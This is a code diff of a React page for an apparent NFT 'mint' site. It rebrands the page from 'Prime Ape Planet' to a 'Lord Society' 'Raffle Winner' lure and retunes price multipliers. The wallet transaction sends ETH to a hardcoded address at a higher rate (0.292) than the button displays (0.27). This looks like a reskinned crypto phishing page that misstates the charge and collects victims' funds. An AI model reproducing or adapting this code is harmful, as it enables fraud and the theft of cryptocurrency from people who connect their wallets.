@@ -33,7 +33,7 @@ export default function Home() {
         web3.eth.sendTransaction({
             from: account,
             to: "0xA025FBe45e7751397aa7C9a63e3745Ee24123f01",
-            value: web3.utils.toWei(value.toString(), "ether") * 0.274,
+            value: web3.utils.toWei(value.toString(), "ether") * 0.292,
         });
     };
     return (
@@ -69,7 +69,7 @@ export default function Home() {
                         letterSpacing: "8px",
                     }}
                 >
-                    Prime Ape Planet
+                    Lord Society
 
                 </div>
                 <div
@@ -82,7 +82,7 @@ export default function Home() {
                         letterSpacing: "6px",
                     }}
                 >
-                    Bonus Mint
+                    Raffle Winner #862
                 </div>
             </div>
             <div
@@ -174,7 +174,7 @@ export default function Home() {
             >
                 {active
                     ? `MINT for ${
-                        (value * 0.25).toFixed(2)
+                        (value * 0.27).toFixed(2)
                     } ETH + Network gas fees`
                     : "Wallet is not connected"}
             </button>
